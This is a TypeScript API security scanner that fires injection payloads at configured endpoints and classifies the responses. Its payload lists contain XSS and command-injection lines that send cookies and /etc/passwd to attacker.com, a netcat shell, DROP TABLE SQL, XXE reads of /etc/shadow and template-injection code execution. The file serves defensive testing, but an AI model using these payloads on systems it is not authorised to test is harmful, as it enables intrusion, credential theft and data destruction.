import { ApiClient, HttpMethod, RequestOptions } from '../api/api-client';
import { APIResponse } from '@playwright/test';
import { SecurityVulnerability, SecurityVulnerabilityType } from './security-testing-agent';

export interface VulnerabilityScanResult {
  endpoint: string;
  method: HttpMethod;
  vulnerabilities: SecurityVulnerability[];
  scanDuration: number;
  totalTests: number;
}

export interface ScanConfiguration {
  endpoints: string[];
  methods: HttpMethod[];
  includeAuthTests: boolean;
  includeInjectionTests: boolean;
  includeRateLimitTests: boolean;
  includeDataExposureTests: boolean;
  customPayloads?: Record<string, string[]>;
  timeout: number;
  maxConcurrentRequests: number;
}

export class SecurityVulnerabilityScanner {
  private apiClient: ApiClient;
  private scanResults: VulnerabilityScanResult[] = [];

  // Comprehensive attack payloads
  private readonly payloads = {
    sqlInjection: [
      // Basic SQL injection
      "1'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1' UNION SELECT * FROM users --",
      "1'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
      
      // Advanced SQL injection
      "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
      "1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
      "1' AND (SELECT * FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT version()), 0x7e, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
      
      // Time-based SQL injection
      "1'; WAITFOR DELAY '00:00:05' --",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
      
      // Boolean-based SQL injection
      "1' AND 1=1 --",
      "1' AND 1=2 --",
      "1' AND (SELECT COUNT(*) FROM users) > 0 --",
      "1' AND (SELECT COUNT(*) FROM users) = 0 --"
    ],
    
    xss: [
      // Basic XSS
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "<iframe src=javascript:alert('XSS')></iframe>",
      
      // Advanced XSS
      "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
      "<img src=x onerror=\"fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})\">",
      "<svg onload=\"fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})\">",
      
      // DOM-based XSS
      "#<script>alert('XSS')</script>",
      "?param=<script>alert('XSS')</script>",
      "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
      
      // Filter bypass XSS
      "<ScRiPt>alert('XSS')</ScRiPt>",
      "<script>alert(String.fromCharCode(88,83,83))</script>",
      "<script>alert(/XSS/)</script>",
      "<script>alert`XSS`</script>"
    ],
    
    commandInjection: [
      // Basic command injection
      "; ls -la",
      "| cat /etc/passwd",
      "&& whoami",
      "`id`",
      "$(cat /etc/passwd)",
      
      // Advanced command injection
      "; cat /etc/passwd | grep root",
      "| nc -l -p 4444 -e /bin/sh",
      "&& curl http://attacker.com/steal",
      "`wget http://attacker.com/steal`",
      "$(curl -X POST -d @/etc/passwd http://attacker.com/steal)",
      
      // Windows command injection
      "& dir",
      "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
      "&& net user",
      "`ipconfig`",
      "$(systeminfo)"
    ],
    
    pathTraversal: [
      // Basic path traversal
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      
      // Advanced path traversal
      "..%252f..%252f..%252fetc%252fpasswd",
      "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
      "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
      "..%255c..%255c..%255cetc%255cpasswd",
      
      // Null byte injection
      "../../../etc/passwd%00",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts%00",
      
      // Double encoding
      "..%252e%252e%252f..%252e%252e%252f..%252e%252e%252fetc%252fpasswd"
    ],
    
    xmlExternalEntity: [
      // Basic XXE
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://attacker.com/steal'>]><root>&xxe;</root>",
      
      // Advanced XXE
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><root>&xxe;</root>",
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><root>&xxe;</root>",
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///proc/version'>]><root>&xxe;</root>",
      
      // XXE with parameter entities
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'file:///etc/passwd'> %xxe;]><root></root>",
      "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY % xxe SYSTEM 'http://attacker.com/steal'> %xxe;]><root></root>"
    ],
    
    ldapInjection: [
      // Basic LDAP injection
      "*)(uid=*))(|(uid=*",
      "*)(|(password=*))",
      "*)(|(objectClass=*))",
      "*)(|(cn=*))",
      
      // Advanced LDAP injection
      "*)(|(userPassword=*))",
      "*)(|(mail=*))",
      "*)(|(telephoneNumber=*))",
      "*)(|(description=*))"
    ],
    
    nosqlInjection: [
      // MongoDB injection
      "{\"$where\": \"this.username == 'admin'\"}",
      "{\"$where\": \"this.password == 'password'\"}",
      "{\"$ne\": null}",
      "{\"$gt\": \"\"}",
      
      // CouchDB injection
      "{\"selector\": {\"username\": {\"$eq\": \"admin\"}}}",
      "{\"selector\": {\"password\": {\"$eq\": \"password\"}}}"
    ],
    
    templateInjection: [
      // Jinja2 template injection
      "{{7*7}}",
      "{{config}}",
      "{{request}}",
      "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
      
      // Twig template injection
      "{{7*7}}",
      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
      
      // Freemarker template injection
      "${7*7}",
      "${'freemarker.template.utility.Execute'?new()('id')}",
      
      // Velocity template injection
      "#set($x=$e.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))"
    ]
  };

  constructor(apiClient: ApiClient) {
    this.apiClient = apiClient;
  }

  /**
   * Perform comprehensive vulnerability scan
   */
  async scanVulnerabilities(config: ScanConfiguration): Promise<VulnerabilityScanResult[]> {
    console.log(`üîç Starting comprehensive vulnerability scan...`);
    console.log(`üìã Endpoints: ${config.endpoints.length}`);
    console.log(`üîß Methods: ${config.methods.join(', ')}`);
    
    const results: VulnerabilityScanResult[] = [];
    
    for (const endpoint of config.endpoints) {
      for (const method of config.methods) {
        console.log(`\nüéØ Scanning ${method} ${endpoint}`);
        
        const startTime = Date.now();
        const vulnerabilities: SecurityVulnerability[] = [];
        let totalTests = 0;
        
        // SQL Injection tests
        if (config.includeInjectionTests) {
          const sqlVulns = await this.testSqlInjection(endpoint, method);
          vulnerabilities.push(...sqlVulns);
          totalTests += this.payloads.sqlInjection.length;
        }
        
        // XSS tests
        if (config.includeInjectionTests) {
          const xssVulns = await this.testXss(endpoint, method);
          vulnerabilities.push(...xssVulns);
          totalTests += this.payloads.xss.length;
        }
        
        // Command Injection tests
        if (config.includeInjectionTests) {
          const cmdVulns = await this.testCommandInjection(endpoint, method);
          vulnerabilities.push(...cmdVulns);
          totalTests += this.payloads.commandInjection.length;
        }
        
        // Path Traversal tests
        if (config.includeInjectionTests) {
          const pathVulns = await this.testPathTraversal(endpoint, method);
          vulnerabilities.push(...pathVulns);
          totalTests += this.payloads.pathTraversal.length;
        }
        
        // XXE tests
        if (config.includeInjectionTests) {
          const xxeVulns = await this.testXxe(endpoint, method);
          vulnerabilities.push(...xxeVulns);
          totalTests += this.payloads.xmlExternalEntity.length;
        }
        
        // Authentication tests
        if (config.includeAuthTests) {
          const authVulns = await this.testAuthentication(endpoint, method);
          vulnerabilities.push(...authVulns);
          totalTests += 5; // 5 auth test scenarios
        }
        
        // Rate limiting tests
        if (config.includeRateLimitTests) {
          const rateVulns = await this.testRateLimiting(endpoint, method);
          vulnerabilities.push(...rateVulns);
          totalTests += 3; // 3 rate limit test scenarios
        }
        
        // Data exposure tests
        if (config.includeDataExposureTests) {
          const dataVulns = await this.testDataExposure(endpoint, method);
          vulnerabilities.push(...dataVulns);
          totalTests += 2; // 2 data exposure test scenarios
        }
        
        const scanDuration = Date.now() - startTime;
        
        results.push({
          endpoint,
          method,
          vulnerabilities,
          scanDuration,
          totalTests
        });
        
        console.log(`‚úÖ Completed ${method} ${endpoint} - Found ${vulnerabilities.length} vulnerabilities`);
      }
    }
    
    this.scanResults = results;
    this.printScanSummary(results);
    
    return results;
  }

  /**
   * Test for SQL injection vulnerabilities
   */
  private async testSqlInjection(endpoint: string, method: HttpMethod): Promise<SecurityVulnerability[]> {
    const vulnerabilities: SecurityVulnerability[] = [];
    
    for (const payload of this.payloads.sqlInjection) {
      try {
        let response: APIResponse;
        
        if (method === 'GET') {
          response = await this.apiClient.get(`${endpoint}/${payload}`);
        } else {
          response = await this.apiClient.requestMethod(method, endpoint, {
            data: { id: payload, name: payload },
            headers: { 'Content-Type': 'application/json' }
          });
        }
        
        const vuln = await this.analyzeSqlInjectionResponse(endpoint, method, payload, response);
        if (vuln) {
          vulnerabilities.push(vuln);
        }
        
        // Small delay to avoid overwhelming the server
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        // Continue with next payload
      }
    }
    
    return vulnerabilities;
  }

  /**
   * Test for XSS vulnerabilities
   */
  private async testXss(endpoint: string, method: HttpMethod): Promise<SecurityVulnerability[]> {
    const vulnerabilities: SecurityVulnerability[] = [];
    
    for (const payload of this.payloads.xss) {
      try {
        const response = await this.apiClient.requestMethod(method, endpoint, {
          data: { 
            name: payload, 
            description: payload,
            title: payload,
            content: payload
          },
          headers: { 'Content-Type': 'application/json' }
        });
        
        const vuln = await this.analyzeXssResponse(endpoint, method, payload, response);
        if (vuln) {
          vulnerabilities.push(vuln);
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        // Continue with next payload
      }
    }
    
    return vulnerabilities;
  }

  /**
   * Test for command injection vulnerabilities
   */
  private async testCommandInjection(endpoint: string, method: HttpMethod): Promise<SecurityVulnerability[]> {
    const vulnerabilities: SecurityVulnerability[] = [];
    
    for (const payload of this.payloads.commandInjection) {
      try {
        const response = await this.apiClient.requestMethod(method, endpoint, {
          data: { 
            command: payload,
            query: payload,
            search: payload,
            input: payload
          },
          headers: { 'Content-Type': 'application/json' }
        });
        
        const vuln = await this.analyzeCommandInjectionResponse(endpoint, method, payload, response);
        if (vuln) {
          vulnerabilities.push(vuln);
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        // Continue with next payload
      }
    }
    
    return vulnerabilities;
  }

  /**
   * Test for path traversal vulnerabilities
   */
  private async testPathTraversal(endpoint: string, method: HttpMethod): Promise<SecurityVulnerability[]> {
    const vulnerabilities: SecurityVulnerability[] = [];
    
    for (const payload of this.payloads.pathTraversal) {
      try {
        const response = await this.apiClient.get(`${endpoint}/${payload}`);
        
        const vuln = await this.analyzePathTraversalResponse(endpoint, method, payload, response);
        if (vuln) {
          vulnerabilities.push(vuln);
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        // Continue with next payload
      }
    }
    
    return vulnerabilities;
  }

  /**
   * Test for XXE vulnerabilities
   */
  private async testXxe(endpoint: string, method: HttpMethod): Promise<SecurityVulnerability[]> {
    const vulnerabilities: SecurityVulnerability[] = [];
    
    for (const payload of this.payloads.xmlExternalEntity) {
      try {
        const response = await this.apiClient.requestMethod(method, endpoint, {
          data: payload,
          headers: { 'Content-Type': 'application/xml' }
        });
        
        const vuln = await this.analyzeXxeResponse(endpoint, method, payload, response);
        if (vuln) {
          vulnerabilities.push(vuln);
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
        
      } catch (error) {
        // Continue with next payload
      }
    }
    
    return vulnerabilities;
  }

  /**
   * Test for authentication vulnerabilities
   */
  private async testAuthentication(endpoint: string, method: HttpMethod): Promise<SecurityVulnerability[]> {
    const vulnerabilities: SecurityVulnerability[] = [];
    
    // Test without authentication
    try {
      const response = await this.apiClient.requestMethod(method, endpoint);
      if (response.status() === 200) {
        vulnerabilities.push({
          type: 'AUTH_BYPASS',
          severity: 'HIGH',
          description: 'Endpoint accessible without authentication',
          endpoint,
          recommendation: 'Implement proper authentication checks',
          cweId: 'CWE-287',
          owaspCategory: 'A07:2021 ‚Äì Identification and Authentication Failures'
        });
      }
    } catch (error) {
      // Expected for protected endpoints
    }
    
    // Test with invalid token
    try {
      const response = await this.apiClient.requestMethod(method, endpoint, {
        headers: { 'Authorization': 'Bearer invalid-token' }
      });
      if (response.status() === 200) {
        vulnerabilities.push({
          type: 'AUTH_BYPASS',
          severity: 'HIGH',
          description: 'Endpoint accessible with invalid token',
          endpoint,
          recommendation: 'Implement proper token validation',
          cweId: 'CWE-287',
          owaspCategory: 'A07:2021 ‚Äì Identification and Authentication Failures'
        });
      }
    } catch (error) {
      // Expected for protected endpoints
    }
    
    return vulnerabilities;
  }

  /**
   * Test for rate limiting vulnerabilities
   */
  private async testRateLimiting(endpoint: string, method: HttpMethod): Promise<SecurityVulnerability[]> {
    const vulnerabilities: SecurityVulnerability[] = [];
    
    try {
      // Send rapid requests
      const requests = [];
      for (let i = 0; i < 20; i++) {
        requests.push(this.apiClient.requestMethod(method, endpoint));
      }
      
      const responses = await Promise.all(requests);
      const rateLimited = responses.some(r => r.status() === 429);
      
      if (!rateLimited) {
        vulnerabilities.push({
          type: 'RATE_LIMIT_BYPASS',
          severity: 'MEDIUM',
          description: 'No rate limiting detected on endpoint',
          endpoint,
          recommendation: 'Implement rate limiting and abuse prevention',
          cweId: 'CWE-770',
          owaspCategory: 'A04:2021 ‚Äì Insecure Design'
        });
      }
    } catch (error) {
      // Continue
    }
    
    return vulnerabilities;
  }

  /**
   * Test for data exposure vulnerabilities
   */
  private async testDataExposure(endpoint: string, method: HttpMethod): Promise<SecurityVulnerability[]> {
    const vulnerabilities: SecurityVulnerability[] = [];
    
    try {
      const response = await this.apiClient.requestMethod(method, endpoint);
      
      if (response.ok()) {
        const body = await response.text();
        const sensitiveDataPatterns = [
          /password/i,
          /secret/i,
          /token/i,
          /key/i,
          /ssn/i,
          /credit.*card/i,
          /social.*security/i
        ];
        
        if (sensitiveDataPatterns.some(pattern => pattern.test(body))) {
          vulnerabilities.push({
            type: 'DATA_EXPOSURE',
            severity: 'HIGH',
            description: 'Sensitive data exposed in response',
            endpoint,
            recommendation: 'Implement data masking and access controls',
            cweId: 'CWE-200',
            owaspCategory: 'A02:2021 ‚Äì Cryptographic Failures'
          });
        }
      }
    } catch (error) {
      // Continue
    }
    
    return vulnerabilities;
  }

  /**
   * Analyze SQL injection response
   */
  private async analyzeSqlInjectionResponse(
    endpoint: string, 
    method: HttpMethod, 
    payload: string, 
    response: APIResponse
  ): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    // If SQL injection payload returns 200, it's a vulnerability
    if (status === 200) {
      return {
        type: 'SQL_INJECTION',
        severity: 'HIGH',
        description: 'API accepts SQL injection payload',
        endpoint,
        payload,
        recommendation: 'Implement input validation and parameterized queries',
        cweId: 'CWE-89',
        owaspCategory: 'A03:2021 ‚Äì Injection'
      };
    }
    
    // Check for SQL error messages
    if (status >= 400) {
      try {
        const body = await response.text();
        const sqlErrorPatterns = [
          /sql syntax/i,
          /mysql/i,
          /postgresql/i,
          /oracle/i,
          /sqlite/i,
          /microsoft.*sql/i,
          /syntax error/i,
          /table.*doesn't exist/i,
          /column.*doesn't exist/i
        ];
        
        if (sqlErrorPatterns.some(pattern => pattern.test(body))) {
          return {
            type: 'INFORMATION_DISCLOSURE',
            severity: 'MEDIUM',
            description: 'SQL error message exposed in response',
            endpoint,
            payload,
            recommendation: 'Implement generic error messages',
            cweId: 'CWE-209',
            owaspCategory: 'A09:2021 ‚Äì Security Logging and Monitoring Failures'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Analyze XSS response
   */
  private async analyzeXssResponse(
    endpoint: string, 
    method: HttpMethod, 
    payload: string, 
    response: APIResponse
  ): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    if (status === 200 || status === 201) {
      try {
        const body = await response.text();
        if (body.includes(payload) && (payload.includes('<script>') || payload.includes('javascript:'))) {
          return {
            type: 'XSS',
            severity: 'MEDIUM',
            description: 'API accepts XSS payload without sanitization',
            endpoint,
            payload,
            recommendation: 'Implement input sanitization and output encoding',
            cweId: 'CWE-79',
            owaspCategory: 'A03:2021 ‚Äì Injection'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Analyze command injection response
   */
  private async analyzeCommandInjectionResponse(
    endpoint: string, 
    method: HttpMethod, 
    payload: string, 
    response: APIResponse
  ): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    if (status === 200 || status === 201) {
      try {
        const body = await response.text();
        const commandOutputPatterns = [
          /uid=\d+/,
          /gid=\d+/,
          /root:x:/,
          /bin\/bash/,
          /total \d+/,
          /drwxr-xr-x/,
          /Microsoft Windows/
        ];
        
        if (commandOutputPatterns.some(pattern => pattern.test(body))) {
          return {
            type: 'INJECTION',
            severity: 'HIGH',
            description: 'Command injection vulnerability detected',
            endpoint,
            payload,
            recommendation: 'Implement input validation and command sanitization',
            cweId: 'CWE-78',
            owaspCategory: 'A03:2021 ‚Äì Injection'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Analyze path traversal response
   */
  private async analyzePathTraversalResponse(
    endpoint: string, 
    method: HttpMethod, 
    payload: string, 
    response: APIResponse
  ): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    if (status === 200) {
      try {
        const body = await response.text();
        const fileContentPatterns = [
          /root:x:0:0/,
          /bin\/bash/,
          /localhost/,
          /127\.0\.0\.1/,
          /Microsoft Windows/
        ];
        
        if (fileContentPatterns.some(pattern => pattern.test(body))) {
          return {
            type: 'INJECTION',
            severity: 'HIGH',
            description: 'Path traversal vulnerability detected',
            endpoint,
            payload,
            recommendation: 'Implement path validation and file access controls',
            cweId: 'CWE-22',
            owaspCategory: 'A01:2021 ‚Äì Broken Access Control'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Analyze XXE response
   */
  private async analyzeXxeResponse(
    endpoint: string, 
    method: HttpMethod, 
    payload: string, 
    response: APIResponse
  ): Promise<SecurityVulnerability | null> {
    const status = response.status();
    
    if (status === 200 || status === 201) {
      try {
        const body = await response.text();
        const fileContentPatterns = [
          /root:x:0:0/,
          /bin\/bash/,
          /localhost/,
          /127\.0\.0\.1/
        ];
        
        if (fileContentPatterns.some(pattern => pattern.test(body))) {
          return {
            type: 'XML_EXTERNAL_ENTITY',
            severity: 'HIGH',
            description: 'XXE vulnerability detected',
            endpoint,
            payload,
            recommendation: 'Disable XML external entity processing',
            cweId: 'CWE-611',
            owaspCategory: 'A05:2021 ‚Äì Security Misconfiguration'
          };
        }
      } catch (e) {
        // Ignore parsing errors
      }
    }
    
    return null;
  }

  /**
   * Print scan summary
   */
  private printScanSummary(results: VulnerabilityScanResult[]): void {
    const totalVulns = results.reduce((sum, r) => sum + r.vulnerabilities.length, 0);
    const criticalVulns = results.reduce((sum, r) => 
      sum + r.vulnerabilities.filter(v => v.severity === 'CRITICAL').length, 0);
    const highVulns = results.reduce((sum, r) => 
      sum + r.vulnerabilities.filter(v => v.severity === 'HIGH').length, 0);
    
    console.log(`\nüîç Vulnerability Scan Summary:`);
    console.log(`üìä Total Vulnerabilities: ${totalVulns}`);
    console.log(`üö® Critical: ${criticalVulns}`);
    console.log(`‚ö†Ô∏è High: ${highVulns}`);
    console.log(`üéØ Endpoints Scanned: ${results.length}`);
    
    // Group by vulnerability type
    const vulnByType = results.reduce((acc, result) => {
      result.vulnerabilities.forEach(vuln => {
        acc[vuln.type] = (acc[vuln.type] || 0) + 1;
      });
      return acc;
    }, {} as Record<string, number>);
    
    console.log(`\nüìã Vulnerability Types:`);
    for (const [type, count] of Object.entries(vulnByType)) {
      console.log(`   ${type}: ${count}`);
    }
  }

  /**
   * Get scan results
   */
  getScanResults(): VulnerabilityScanResult[] {
    return this.scanResults;
  }

  /**
   * Clear scan results
   */
  clearResults(): void {
    this.scanResults = [];
  }
}

export default SecurityVulnerabilityScanner;
